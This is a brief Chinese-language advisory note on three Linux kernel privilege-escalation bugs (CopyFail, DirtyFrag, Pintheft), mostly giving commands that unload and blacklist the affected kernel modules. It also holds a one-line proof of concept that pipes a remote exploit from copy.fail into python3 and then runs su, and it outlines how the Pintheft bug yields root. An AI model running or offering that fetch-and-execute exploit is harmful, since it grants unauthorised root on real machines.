# CopyFail
## 缓解措施
需重启：更新内核到`linux 7.0+`
无需重启：
``` shell
echo 3 | sudo tee /proc/sys/vm/drop_caches
rmmod algif_aead
echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/copyfail.conf
```

## POC/LPE
``` shell
curl https://copy.fail/exp | python3 && su
```


# DirtyFrag
## 缓解措施
无需重启：
``` shell
echo 3 | sudo tee /proc/sys/vm/drop_caches
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
```

## POC/LPE
参见[原始博客](https://github.com/V4bel/dirtyfrag)。



# Pintheft LPE  
Linux RDS(Reliable Datagram Sockets) 模块存在重复释放问题导致攻击者可以利用 io_uring 模块去覆写具有 suid 的 Page cache 从而实现LPE。  
缓解办法：拉黑 `rds_tcp` `rds` 模块  

``` shell
rmmod rds_tcp rds
printf 'install rds /bin/false\ninstall rds_tcp /bin/false\n' > /etc/modprobe.d/pintheft.conf
```
